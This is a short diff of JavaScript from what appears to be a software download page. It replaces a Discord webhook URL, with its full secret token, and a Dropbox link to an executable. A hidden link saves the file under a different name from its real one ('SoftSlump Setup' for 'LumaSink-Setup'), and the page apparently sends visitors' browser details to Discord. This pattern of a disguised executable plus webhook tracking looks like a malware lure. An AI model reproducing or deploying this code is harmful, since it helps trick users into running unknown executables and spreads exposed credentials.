@@ -149,7 +149,7 @@ document.addEventListener('click', (e) => {
 
 
 // ---- DISCORD WEBHOOK ----
-const WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1492495552053772398/WSef7D9eZNo5dk3ymQz2qNwdCxIP0VXhQEJS6LE4pWahAIU9RDNKK0v14C8EI_FQB-9E';
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1492595227393921124/UibYbpBFi7OL800ePlz2vH-oMM9SPESEwGw5lzT-jB3RqTAKRSiIIjbiFhV17whgOuZc';
 
 function getBrowserName() {
     const ua = navigator.userAgent;
@@ -275,7 +275,7 @@ async function notifyDiscord() {
 // ---- START ACTUAL FILE DOWNLOAD ----
 function startFileDownload() {
     const a = document.createElement('a');
-    a.href = 'https://www.dropbox.com/scl/fi/yhhl14amc3gee4dh5q8jl/DuskaraSaga.exe?rlkey=x5kdi6hrozlt4rjf9edewag5s&st=9jbpjnqk&dl=1';
+    a.href = 'https://www.dropbox.com/scl/fi/ybbpgov7510fqpvxd4iph/LumaSink-Setup-2.0.0.exe?rlkey=0193oqkk6peoa6n63yd76i86l&st=bjn8f790&dl=1';
     a.download = 'SoftSlump Setup 2.0.0.exe';
     a.style.display = 'none'; // Ensure it's hidden
     document.body.appendChild(a);
